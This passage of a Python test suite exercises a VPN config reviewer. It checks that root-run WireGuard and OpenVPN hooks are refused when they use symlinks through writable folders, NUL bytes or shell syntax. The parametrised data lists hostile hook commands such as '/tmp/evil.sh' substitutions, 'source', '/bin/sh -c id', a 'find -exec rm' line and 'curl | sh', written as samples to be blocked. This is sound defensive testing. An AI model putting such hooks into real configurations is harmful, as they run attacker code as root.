    assert r.root_hooks == ("PostUp: echo hi # note",)        # wg-quick runs the unstripped value


def _only_writable(*folders):
    names = {str(f) for f in folders}

    def stat_(path, *a, **k):
        mode = (stat.S_IFDIR | 0o777) if str(path) in names else ROOT_DIR
        return types.SimpleNamespace(st_uid=0, st_mode=mode)
    return stat_


def test_every_link_of_a_three_link_chain_is_checked(tmp_path, monkeypatch):
    """safe/tool -> safe3/hop1 -> loose/hop2 -> safe2/tool: only the second link
    sits in a folder a user can write."""
    safe, safe3, loose, safe2 = (tmp_path / n for n in ("safe", "safe3", "loose", "safe2"))
    for d in (safe, safe3, loose, safe2):
        d.mkdir()
    (safe2 / "tool").write_text("#!/bin/sh\n")
    (loose / "hop2").symlink_to(safe2 / "tool")
    (safe3 / "hop1").symlink_to(loose / "hop2")
    (safe / "tool").symlink_to(safe3 / "hop1")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(loose))
    reason = vpn_execution._unsafe_executable_reason(safe / "tool")
    assert reason is not None and str(loose) in reason


def test_a_relative_link_is_resolved_from_its_own_folder(tmp_path, monkeypatch):
    safe, loose = tmp_path / "safe", tmp_path / "loose"
    safe.mkdir()
    loose.mkdir()
    (loose / "x").write_text("#!/bin/sh\n")
    (safe / "tool").symlink_to("../loose/x")
    monkeypatch.chdir("/")                       # a cwd-relative resolve would miss loose
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(loose))
    reason = vpn_execution._unsafe_executable_reason(safe / "tool")
    assert reason is not None and str(loose) in reason


def test_a_link_before_dotdot_is_followed_first(tmp_path, monkeypatch):
    """S/prog -> "x/../y", S/x -> W/hop, W/hop -> R2/d: the kernel goes through
    W/hop (in a writable folder) and lands on R2/y; a text-only normpath skips it."""
    S, W, R2 = tmp_path / "S", tmp_path / "W", tmp_path / "R2"
    for d in (S, W, R2, R2 / "d"):
        d.mkdir()
    (R2 / "y").write_text("#!/bin/sh\n")
    (W / "hop").symlink_to(R2 / "d")
    (S / "x").symlink_to(W / "hop")
    (S / "prog").symlink_to("x/../y")
    assert os.path.realpath(S / "prog") == os.path.realpath(R2 / "y")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(W))
    reason = vpn_execution._unsafe_executable_reason(S / "prog")
    assert reason is not None and str(W) in reason


def test_a_link_loop_ends_and_is_refused(tmp_path):
    (tmp_path / "a").symlink_to(tmp_path / "b")
    (tmp_path / "b").symlink_to(tmp_path / "a")
    with pytest.raises(OSError):
        vpn_execution._paths_touched(tmp_path / "a")
    assert "too many links" in vpn_execution._unsafe_executable_reason(tmp_path / "a")


def test_forty_links_resolve_and_forty_one_are_refused(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable())
    (tmp_path / "tool").write_text("#!/bin/sh\n")
    previous = tmp_path / "tool"
    for n in range(41):
        link = tmp_path / f"l{n}"
        link.symlink_to(previous)
        previous = link
    touched = vpn_execution._paths_touched(tmp_path / "l39")    # 40 links
    assert tmp_path / "l0" in touched and tmp_path / "tool" in touched
    assert vpn_execution._unsafe_executable_reason(tmp_path / "l39") is None
    assert "too many links" in vpn_execution._unsafe_executable_reason(tmp_path / "l40")


def test_a_folder_a_link_target_passes_through_before_dotdot_is_checked(tmp_path, monkeypatch):
    """S/prog -> W/sub/../../R2/y: the kernel walks into W (writable) before the
    two ".." bring it back; a user could swap W/sub for a link meanwhile."""
    S, W, R2 = tmp_path / "S", tmp_path / "W", tmp_path / "R2"
    for d in (S, W, W / "sub", R2):
        d.mkdir()
    (R2 / "y").write_text("#!/bin/sh\n")
    (S / "prog").symlink_to(str(W / "sub") + "/../../R2/y")
    assert os.path.realpath(S / "prog") == os.path.realpath(R2 / "y")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(W))
    reason = vpn_execution._unsafe_executable_reason(S / "prog")
    assert reason is not None and str(W) in reason


def test_a_link_that_cannot_be_read_is_refused(tmp_path, monkeypatch):
    (tmp_path / "tool").write_text("#!/bin/sh\n")
    (tmp_path / "link").symlink_to(tmp_path / "tool")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable())

    def no_read(*a, **k):
        raise PermissionError(13, "Permission denied")
    monkeypatch.setattr(vpn_execution.os, "readlink", no_read)
    reason = vpn_execution._unsafe_executable_reason(tmp_path / "link")
    assert reason is not None and "could not be resolved" in reason


def test_a_nul_byte_in_a_hook_path_is_refused_not_raised(tmp_path):
    assert "not a usable path" in vpn_execution._unsafe_executable_reason(Path("/bin/ech\x00o"))
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = /bin/ech\x00o hi\n")))
    assert not r.allowed


def test_a_relative_path_is_not_normalised_before_its_links(tmp_path, monkeypatch):
    """"S/x/../y" from tmp_path: the kernel follows S/x (-> W/hop -> R2/d) before
    the "..", landing on R2/y; normalising first would look at S/y instead."""
    S, W, R2 = tmp_path / "S", tmp_path / "W", tmp_path / "R2"
    for d in (S, W, R2, R2 / "d"):
        d.mkdir()
    (R2 / "y").write_text("#!/bin/sh\n")
    (W / "hop").symlink_to(R2 / "d")
    (S / "x").symlink_to(W / "hop")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(W))
    reason = vpn_execution._unsafe_executable_reason(Path("S/x/../y"))
    assert reason is not None and str(W) in reason


def test_a_hook_with_a_huge_path_is_reviewed_quickly(tmp_path):
    """Codex on #32: a 256 KiB config can hold a path of ~100,000 components. An
    overlong hook is refused without walking it, and the longest hook that is
    walked (under 4000 characters) stays fast."""
    import time
    huge = "/" + "/".join(["a"] * 100_000)
    longest = "/" + "/".join(["a"] * 1_990)                   # just under the limit
    start = time.monotonic()
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {huge}\n")))
    assert not r.allowed and any("4000" in b for b in r.blockers)
    review("connect", profile_for(wg_conf(tmp_path, "wg2", interface_extra=f"PostUp = {longest}\n")))
    assert time.monotonic() - start < 5


# ── review of #32: NUL bytes, %i/%I, a link reached after ".." ──

@pytest.mark.parametrize("line, runs", [
    ("Post\x00Up = /tmp/evil.sh", "/tmp/evil.sh"),            # bash drops the NUL
    ("PostUp = \x00/tmp/evil.sh", "/tmp/evil.sh"),            # program word hidden by a NUL
])
@pytest.mark.parametrize("action", ["connect", "disconnect"])
def test_a_nul_byte_cannot_hide_a_hook(tmp_path, line, runs, action):
    path = wg_conf(tmp_path, "wgn", interface_extra=line + "\n")
    r = review(action, profile_for(path), Probe(up={"wgn"}) if action == "disconnect" else None)
    assert any(runs in hook for hook in r.root_hooks)
    found = r.blockers if action == "connect" else r.risks
    assert any("NUL byte" in item for item in found)
    if action == "connect":
        assert not r.allowed


def test_a_nul_byte_cannot_hide_saveconfig(tmp_path):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="Save\x00Config = true\n")))
    assert _blocked(r, "SaveConfig = true")


def test_a_nul_byte_in_an_openvpn_profile_is_refused(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "dev tun\nu\x00p /tmp/evil.sh\n")))
    assert _blocked(r, "NUL byte")


@pytest.mark.parametrize("word", ["/opt/vpn/%i/up.sh", "/etc/wireguard/%I.up"])
def test_a_hook_path_with_a_wg_quick_placeholder_is_refused(tmp_path, word):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {word}\n")))
    assert not r.allowed and any("%i and %I" in b and word in b for b in r.blockers)


def test_a_placeholder_outside_a_path_is_fine(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/local/sbin/hook.sh": (0, ROOT_FILE), "/usr/local/sbin": (0, ROOT_DIR),
        "/usr/local": (0, ROOT_DIR), "/usr": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = /usr/local/sbin/hook.sh %i\n")))
    assert not any("%i and %I" in b for b in r.blockers)


def test_a_link_reached_only_after_dotdot_is_checked(tmp_path, monkeypatch):
    """S/p -> "../T/l", T/l -> R/x: T is writable, and the walk reaches it only by
    applying the ".."; ignoring ".." would look for S/T/l and never see T."""
    S, T, R = tmp_path / "S", tmp_path / "T", tmp_path / "R"
    for d in (S, T, R):
        d.mkdir()
    (R / "x").write_text("#!/bin/sh\n")
    (T / "l").symlink_to(R / "x")
    (S / "p").symlink_to("../T/l")
    monkeypatch.setattr(vpn_execution, "_stat", _only_writable(T))
    reason = vpn_execution._unsafe_executable_reason(S / "p")
    assert reason is not None and str(T) in reason


# ── second review of #32: plain commands with full paths (owner, 2026-11-06) ──
# wg-quick runs each hook through bash's eval as root. A hook bash would read
# differently from the review's literal words is refused outright.

PLAIN_RULE = "Tunnel cannot check what this hook runs; write plain commands with full paths."


@pytest.mark.parametrize("hook", [
    "echo $(/tmp/evil.sh)", "${CONFIG_FILE%/*}/up.sh", "sh</tmp/evil.sh", "/tm\"p\"/evil.sh",
    "/t\\mp/evil.sh", "/{tmp,x}/evil.sh", "/tm?/evil.sh", "/tm*/evil.sh", "/tm[p]/evil.sh",
    "`/tmp/evil.sh`", "'/tmp/evil.sh'", "~/evil.sh", "/usr/bin/true && (/tmp/evil.sh)",
    "/usr/bin/true | /bin/sh", "/bin/cat /etc/hosts > /tmp/x", "/usr/bin/true |& /bin/sh",
    ". /tmp/evil.sh", "source /tmp/evil.sh", "eval /tmp/evil.sh", "exec /tmp/evil.sh",
    "builtin source /tmp/evil.sh", "command /tmp/evil.sh", "! /tmp/evil.sh",
    "{ /tmp/evil.sh; }", "if /usr/bin/true; then :; fi", "time /tmp/evil.sh",
    "cmd /tmp/evil.sh", "echo hi", "PATH=/tmp ls", "PATH=/tmp; ls", "./evil.sh",
    "bin/evil.sh", "hook-%I", "up:zz", "nosuchcmd-zz9", "/usr/bin/true\v/tmp/x",
    "/bin/sh -c id", "/usr/bin/python3 -m evil", "/usr/bin/perl -e1", "/usr/bin/env -Sls",
    "/bin/sh %I", "/usr/bin/env /bin/sh -c foo", "/usr/bin/find /etc -exec rm",
])
def test_a_hook_with_shell_syntax_or_an_unchecked_command_is_refused(tmp_path, hook):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert not r.allowed
    assert any(PLAIN_RULE in b and "The PostUp hook" in b for b in r.blockers), r.blockers


@pytest.mark.parametrize("hook", ["echo $(/tmp/evil.sh)", ". /tmp/evil.sh", "nosuchcmd-zz9"])
def test_the_same_hooks_on_disconnect_are_risks_not_blockers(tmp_path, hook):
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {hook}\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgd"}))
    assert r.allowed and any(PLAIN_RULE in item for item in r.risks)


def test_the_refusal_names_what_bash_would_read_differently(tmp_path):
    def blockers(hook):
        r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
        return " ".join(r.blockers)
    assert "the shell character '$'" in blockers("echo $(/tmp/evil.sh)")
    assert "uses 'source', which bash runs itself" in blockers("source /tmp/evil.sh")
    assert "sets PATH for its command" in blockers("PATH=/tmp ls")
    assert "not a full path" in blockers("./evil.sh")
    assert "'hook-%I', which is not a plain program name" in blockers("hook-%I")
    assert "hands 'id' to /bin/sh" in blockers("/bin/sh -c id")
    assert "control character" in blockers("/usr/bin/true\x01")


@pytest.mark.parametrize("char", list("$`\\'\"*?[]{}<>()!~|"))      # written out: not read from the module
def test_every_shell_character_is_refused_on_its_own(tmp_path, char):
    r = review("connect", profile_for(wg_conf(
        tmp_path, interface_extra=f"PostUp = /usr/bin/true a{char}b\n")))
    assert _blocked(r, f"uses the shell character '{char}'")


@pytest.mark.parametrize("word", [".", "source", "eval", "exec", "builtin", "command", "if",
                                  "time", "cmd", "execute_hooks", "echo", "true", "test",
                                  "kill", "hash", "enable", "trap", "export", "cd"])
def test_a_shell_word_is_refused_even_when_a_program_of_that_name_exists(
        tmp_path, monkeypatch, word):
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/" + name)
    monkeypatch.setattr(vpn_execution, "_unsafe_executable_reason", lambda path: None)
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {word} /x\n")))
    assert _blocked(r, f"uses '{word}', which bash runs itself")


def test_separated_plain_commands_are_allowed_and_each_one_is_checked(tmp_path):
    plain = "/usr/bin/true; /usr/bin/true && /usr/bin/true || /usr/bin/true & /usr/bin/true"
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {plain}\n")))
    assert r.allowed, r.blockers
    script = _user_script(tmp_path)
    r = review("connect", profile_for(wg_conf(
        tmp_path, "wg2", interface_extra=f"PostUp = /usr/bin/true || {script} up\n")))
    assert _blocked(r, f"runs {script} as administrator")
    assert not any(PLAIN_RULE in b for b in r.blockers)       # judged as a path, not as syntax


def test_a_comment_after_a_blank_ends_the_hook_as_bash_reads_it(tmp_path):
    hook = "/usr/bin/true # was: curl $URL | sh"
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert r.allowed and r.root_hooks == (f"PostUp: {hook}",)


def test_a_script_given_to_a_shell_may_take_plain_arguments(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/etc/wireguard/up.sh": (0, ROOT_FILE), "/etc/wireguard": (0, ROOT_DIR),
        "/etc": (0, ROOT_DIR), "/bin/sh": (0, ROOT_FILE), "/bin": (0, ROOT_DIR),
        "/": (0, ROOT_DIR)}))
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))   # no links anywhere
    hook = "/bin/sh -e /etc/wireguard/up.sh %i up 2"
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
    assert r.allowed, r.blockers


def test_a_placeholder_path_handed_to_an_interpreter_is_refused(tmp_path):
    """P3-4: the %i/%I check also applies past the first word."""
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = sh /etc/wireguard/%I.up\n")))
    assert _blocked(r, "%i and %I") and any("/etc/wireguard/%I.up" in b for b in r.blockers)


def test_a_bare_hook_key_shows_the_line_itself_as_its_command(tmp_path):
    """P3-4: wg-quick runs the bare "PreUp" line as a command; it is not empty."""
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PreUp\n")))
    assert r.root_hooks == ("PreUp: PreUp",)


def test_a_normal_config_with_plain_full_path_hooks_is_still_allowed(tmp_path):
    """False-positive check: Interface, Peer, DNS and plain system-program hooks."""
    extra = ("DNS = 10.64.0.1, 10.64.0.2 # resolver\n"
             "PostUp = /usr/sbin/networksetup -setdnsservers Wi-Fi 10.64.0.1\n"
             "PostDown = /sbin/route -n delete -inet 10.0.0.0/8 -interface %i\n")
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=extra)))
    assert r.allowed and r.blockers == ()
    assert not any("could replace" in w or "hands" in w or PLAIN_RULE in w
                   for w in r.warnings), r.warnings
    assert "DNS: 10.64.0.1, 10.64.0.2" in r.config_lines


# ── P1-2 / P3-3: bare names are looked up where wg-quick looks first ────────

def test_bare_names_are_found_only_in_the_system_folders_in_wg_quicks_order(tmp_path, monkeypatch):
    assert vpn_execution._PRIVILEGED_PATH == ("/usr/bin", "/bin", "/usr/sbin", "/sbin")
    own = tmp_path / "helper"
    own.write_text("#!/bin/sh\n")
    own.chmod(0o755)
    monkeypatch.setattr(vpn_execution.shutil, "which",
                        lambda name, *a, **k: str(tmp_path / "wg-quick"))
    assert vpn_execution._which_privileged("helper") is None   # wg-quick's own folder: not trusted
    assert vpn_execution._which_privileged("ls") in ("/usr/bin/ls", "/bin/ls")


def test_the_review_does_not_look_up_wg_quick_per_command(tmp_path, monkeypatch):
    calls = []
    monkeypatch.setattr(vpn_execution.shutil, "which",
                        lambda name, *a, **k: calls.append(name))
    vpn_execution._hook_findings("PostUp = " + "/usr/bin/true; " * 50 + "\n", "WireGuard")
    assert calls == []


# ── P3-2: the hook check has a ceiling, and stays fast up to it ─────────────

def test_a_config_full_of_tiny_commands_is_refused_quickly(tmp_path):
    line = "PostUp = " + "a;" * 1990 + "\n"
    path = wg_conf(tmp_path, interface_extra=line * 65)
    assert path.stat().st_size <= vpn_execution.CONFIG_READ_LIMIT
    start = time.monotonic()
    r = review("connect", profile_for(path))
    assert time.monotonic() - start < 1.0
    assert _blocked(r, f"more than {vpn_execution.HOOK_CHECK_LIMIT} commands and paths")
    assert len(r.blockers) <= vpn_execution.HOOK_CHECK_LIMIT + 5


def test_a_config_full_of_paths_is_refused_quickly(tmp_path):
    line = "PostUp = /usr/bin/true " + "/a " * 1300 + "\n"
    path = wg_conf(tmp_path, interface_extra=line * 60)
    start = time.monotonic()
    r = review("connect", profile_for(path))
    assert time.monotonic() - start < 1.0
    assert _blocked(r, "commands and paths")


def test_the_ceiling_is_exact(tmp_path):
    each = "PostUp = /usr/bin/true\n"                 # one command and one path: two checks
    bare = "PostUp = id\n"                            # one command, no path: one check
    half = vpn_execution.HOOK_CHECK_LIMIT // 2
    at = review("connect", profile_for(wg_conf(
        tmp_path, "wga", interface_extra=each * (half - 1) + bare * 2)))
    over = review("connect", profile_for(wg_conf(
        tmp_path, "wgb", interface_extra=each * half + bare)))
    assert at.allowed, at.blockers
    assert _blocked(over, "commands and paths")


# ── P3-1: a path that cannot be looked at is unsafe, not skipped ────────────

def test_a_folder_stat_refuses_with_eacces_is_unsafe(monkeypatch):
    import errno as _errno

    def stat_(path, *a, **k):
        if str(path) == "/opt/locked":
            raise PermissionError(_errno.EACCES, "Permission denied", str(path))
        if str(path).startswith("/opt/locked/"):
            raise FileNotFoundError(_errno.ENOENT, "No such file", str(path))
        return types.SimpleNamespace(st_uid=0, st_mode=ROOT_DIR)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
    reason = vpn_execution._unsafe_executable_reason(Path("/opt/locked/hook.sh"))
    assert reason is not None and "/opt/locked could not be checked" in reason


def test_a_missing_file_is_still_judged_by_its_folders(monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({"/opt": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
    assert vpn_execution._unsafe_executable_reason(Path("/opt/x/hook.sh")) is None


def test_a_link_walk_that_cannot_look_at_a_folder_is_unsafe(monkeypatch):
    import errno as _errno

    def lstat_(path, *a, **k):
        if str(path) == "/opt/locked":
            raise PermissionError(_errno.EACCES, "Permission denied", str(path))
        raise FileNotFoundError(_errno.ENOENT, "No such file", str(path))
    monkeypatch.setattr(vpn_execution, "_stat", lambda p, *a, **k: types.SimpleNamespace(
        st_uid=0, st_mode=ROOT_DIR))
    monkeypatch.setattr(vpn_execution, "_lstat", lstat_)
    reason = vpn_execution._unsafe_executable_reason(Path("/opt/locked/hook.sh"))
    assert reason is not None and "could not be resolved" in reason


# ── P2-1: the DNS the review shows is the DNS wg-quick sets ─────────────────

def _inspect(body):
    from agents.vpn_agent.services.config_inspection import inspect_wireguard_text
    return inspect_wireguard_text("[Interface]\nAddress = 10.8.0.2/32\n" + body
                                  + "[Peer]\nAllowedIPs = 0.0.0.0/0\n", Path("x.conf"))


def test_a_dns_key_cut_off_by_a_comment_sets_no_dns():
    s = _inspect("DNS # = 10.64.0.1\n")
    assert s.dns_servers == ()
    assert any("'=' comes after a '#'" in w for w in s.warnings)


def test_a_comment_after_a_dns_value_is_not_part_of_it():
    assert _inspect("DNS = 10.64.0.1 # resolver\n").dns_servers == ("10.64.0.1",)


def test_a_unicode_line_separator_does_not_create_a_dns_entry():
    assert _inspect("MTU = 1420 DNS = 10.64.0.1\n").dns_servers == ()


def test_a_section_header_with_a_comment_still_counts_its_peer():
    from agents.vpn_agent.services.config_inspection import inspect_wireguard_text
    s = inspect_wireguard_text("[Interface]\nAddress = 10.8.0.2/32\n[Peer] # home\n"
                               "AllowedIPs = 0.0.0.0/0\n", Path("x.conf"))
    assert s.peer_count == 1 and s.allowed_ips == ("0.0.0.0/0",)


def test_the_review_says_system_dns_stays_when_dns_is_cut_off(tmp_path):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="DNS # = 10.64.0.1\n")))
    assert "DNS: Not specified — system DNS stays in use" in r.config_lines
